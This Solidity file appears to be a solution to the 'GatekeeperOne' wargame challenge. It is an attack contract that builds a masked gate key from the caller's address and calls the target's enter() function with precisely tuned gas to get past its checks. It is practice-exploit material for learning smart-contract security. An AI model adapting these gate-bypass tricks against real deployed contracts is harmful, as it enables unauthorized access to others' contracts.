// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IGateKeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}
contract GatekeeperOneExploit{
    IGateKeeperOne gko;

    constructor(address _gkoAddr){
        gko = IGateKeeperOne(_gkoAddr);
    }
    function exploit() public payable{
        //Cast EOA address and mask, if you want this to be more consistent change msg.sender to tx.origin
        bytes8 gateKey = bytes8(uint64(uint160(msg.sender))) & 0xFFFFFFFF0000FFFF;
        //Generate calldata for lowlevel call
        bytes memory data  = abi.encodeWithSignature("enter(bytes8)", gateKey);
        // This 256 constant was calculated via a foundry test
        (bool success, ) = address(gko).call{gas:8191 * 10 + 256}(data);
        // require(gko.enter{gas: 8191 * 10 + gas}(gateKey));
        require(success, "failed");
    }

}



